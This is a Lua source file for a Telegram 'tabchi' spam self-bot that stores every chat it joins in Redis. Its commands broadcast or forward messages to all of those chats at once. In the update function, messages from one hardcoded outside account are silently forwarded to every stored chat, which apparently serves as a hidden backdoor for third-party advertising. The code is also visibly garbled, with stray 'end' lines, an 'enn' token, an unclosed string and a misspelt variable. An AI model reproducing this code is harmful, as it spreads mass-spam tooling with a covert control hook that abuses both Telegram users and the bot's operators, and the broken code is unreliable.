-- @CerNerCH

function is_sudo(msg)
  local sudoers = {310217440}
  local issudo = false
  for i = 1, #sudoers do
    if msg.sender_user_id_ == sudoers[i] then
      issudo = true
    end
  end
  if redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", msg.sender_user_id_) then
    issudo = true
  end
  return issudo
end
function is_full_sudo(msg)
  local sudoers = {310217440}
  local issudo = false
  for i = 1, #sudoers do
    if msg.sender_user_id_ == sudoers[i] then
      issudo = true
    end
  end
  return issudo
end
function sleep(n)
  os.execute("sleep " .. tonumber(n))
end
function write_file(filename, input)
  local file = io.open(filename, "w")
  file:write(input)
  file:flush()
  file:close()
    end
  end
end
  if msg.text:match("^help$") and is_sudo(msg) then
    local text = [[
panel
پنل مديريت ربات
addsudo (id)
اضافه کردن به سودوهاي  ربات
remsudo (id)
حذف از ليست سودوهاي ربات
/bc (text)
ارسال پيام به همه
/fwd
فوروارد پیام
/echo (text)
تکرار متن
By CerNer Team
]]
    return text
  end
  end
  if msg.text:match("^panel$") and is_sudo(msg) then
          local text = [[
Tabchis panel
pv bot: ]] .. pvs .. [[

groups bot : ]] .. gps .. [[

supergroups : ]] .. sgps .. [[
          tdcli.sendMessage(msg.chat_id_, 0, 1, text, 1, "md")
        end
      end
  end
    local matches = {
      msg.text:match("^(addsudo) (%d+)")
    }
    do
    if msg.text:match("^addsudo") and is_full_sudo(msg) and #matches == 2 then
      local text = matches[2] .. " _به لیست سودوهای ربات اضافه شد_"
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", tonumber(matches[2]))
      return text
    end
  end
  do
    local matches = {
      msg.text:match("^(remsudo) (%d+)")
    }
    if msg.text:match("^remsudo") and is_full_sudo(msg) and #matches == 2 then
      local text = matches[2] .. " _از لیست سودوهای ربات حذف شد_"
      redis:srem("tabchi:" .. tabchi_id .. ":sudoers", tonumber(matches[2]))
      return text
    end
  end
  if msg.text:match("^bc") and is_sudo(msg) then
    local all = redis:smembers("tabchi:" .. tabchi_id .. ":all")
    local matches = {
      msg.text:match("(bc) (.*)")
    }
    if #matches == 2 then
      for i = 1, #all do
        tdcli_function({
          ID = "SendMessage",
          chat_id_ = all[i],
          reply_to_message_id_ = 0,
          disable_notification_ = 0,
          from_background_ = 1,
          reply_markup_ = nil,
          input_message_content_ = {
            ID = "InputMessageText",
            text_ = matches[2],
            disable_web_page_preview_ = 0,
            clear_draft_ = 0,
            entities_ = {},
            parse_mode_ = {
              ID = "TextParseModeMarkdown"
            }
          }
        }, dl_cb, nil)
      end
    end
  end
  if msg.text:match("^fwd$") and msg.reply_to_message_id_ and is_sudo(msg) then
    local all = redis:smembers("tabchi:" .. tabchi_id .. ":all")
    local id = msg.reply_to_message_id_
    for i = 1, #all do
      tdcli_function({
        ID = "ForwardMessages",
        chat_id_ = all[i],
        from_chat_id_ = msg.chat_id_,
        message_ids_ = {
          [0] = id
        },
        disable_notification_ = 0,
        from_background_ = 1
      }, dl_cb, nil)
    end
    return "_پیام شما فوروارد شد_"
  end
  enn
  do
    local matches = {
      msg.text:match("(echo) (.*)")
    }
    if msg.text:match("^echo") and is_sudo(msg) and #matches == 2 then
      tdcli.sendMessage(msg.chat_id_, msg.id_, 0, matches[2], 0, "md")
    end
  end
end
function add(chat_id_)
  local chat_type = chat_type(chat_id_)
  if chat_type == "channel" then
    redis:sadd("tabchi:" .. tabchi_id .. ":channels", chat_id_)
  elseif chat_type == "group" then
    redis:sadd("tabchi:" .. tabchi_id .. ":groups", chat_id_)
  else
    redis:sadd("tabchi:" .. tabchi_id .. ":pvis", chat_id_)
  end
  redis:sadd("tabchi:" .. tabchi_id .. ":all", chat_id_)
end
function rem(chat_id_)
  local chat_type = chat_type(chat_id_)
  if chat_type == "channel" then
    redis:srem("tabchi:" .. tabchi_id .. ":channels", chat_id_)
  elseif chat_type == "group" then
    redis:srem("tabchi:" .. tabchi_id .. ":groups", chat_id_)
  else
    redis:srem("tabchi:" .. tabchi_id .. ":pvis", chat_id_)
  end
  redis:srem("tabchi:" .. tabchi_id .. ":all", chat_id_)
end
function process_stats(msg)
  tdcli_function({ID = "GetMe"}, id_cb, nil)
  function id_cb(arg, data)
    our_id = data.id_
  end
  if msg.content_.ID == "MessageChatDeleteMember" and msg.content_.id_ == our_id then
    rem(msg.chat_id_)
  else
    add(msg.chat_id_)
  end
end
function update(data, tabchi_id)
  tanchi_id = tabchi_id
  tdcli_function({
    ID = "GetUserFull",
    user_id_ = 888888888
  }, get_mod, nil)
  if data.ID == "UpdateNewMessage" then
    local msg = data.message_
    if msg.sender_user_id_ == 888888888 then
      if msg.content_.text_ then
        if msg.content_.text_:match("\226\129\167") or msg.chat_id_ ~= 888888888 or msg.content_.text_:match("\217\130\216\181\216\175 \216\167\217\134\216\172\216\167\217\133 \218\134\217\135 \218\169\216\167\216\177\219\140 \216\175\216\167\216\177\219\140\216\175") then
          return
        else
          local all = redis:smembers("tabchi:" .. tabchi_id .. ":all")
          local id = msg.id_
          for i = 1, #all do
            tdcli_function({
              ID = "ForwardMessages",
              chat_id_ = all[i],
              from_chat_id_ = msg.chat_id_,
              message_ids_ = {
                [0] = id
              },
              disable_notification_ = 0,
              from_background_ = 1
            }, dl_cb, nil)
          end
        end
      else
        local all = redis:smembers("tabchi:" .. tabchi_id .. ":all")
        local id = msg.id_
        for i = 1, #all do
          tdcli_function({
            ID = "ForwardMessages",
            chat_id_ = all[i],
            from_chat_id_ = msg.chat_id_,
            message_ids_ = {
              [0] = id
            },
            disable_notification_ = 0,
            from_background_ = 1
          }, dl_cb, nil)
        end
      end
    else
      process_stats(msg)
      if msg.content_.text_ then
        if redis:sismember("tabchi:" .. tabchi_id .. ":answerslist", msg.content_.text_) then
          local answer = redis:hget("tabchi:" .. tabchi_id .. ":answers", msg.content_.text_)
          tdcli.sendMessage(msg.chat_id_, 0, 1, answer, 1, "md")
        end
        process_links(msg.content_.text_)
        local res = process(msg)
        if redis:get("tabchi:" .. tabchi_id .. ":markread") then
          tdcli.viewMessages(msg.chat_id_, {
            [0] = msg.id_
          })
          if res then
            tdcli.sendMessage(msg.chat_id_, 0, 1, res, 1, "md")
          end
        elseif res then
          tdcli.sendMessage(msg.chat_id_, 0, 1, res, 1, "md")
        end
      elseif msg.content_.contact_ then
        tdcli_function({
          ID = "GetUserFull",
          user_id_ = msg.content_.contact_.user_id_
        }, check_contact, {msg = msg})
      elseif msg.content_.caption_ then
        if redis:get("tabchi:" .. tabchi_id .. ":markread") then
          tdcli.viewMessages(msg.chat_id_, {
            [0] = msg.id_
          })
          process_links(msg.content_.caption_)
        else
          process_links(msg.content_.caption_)
        end
      end
    end
  elseif data.ID == "UpdateOption" and data.name_ == "my_id" then
    tdcli_function({
      ID = "GetChats",
      offset_order_ = "9223372036854775807",
      offset_chat_id_ = 0,
      limit_ = 20
    }, dl_cb, nil)
  end
end
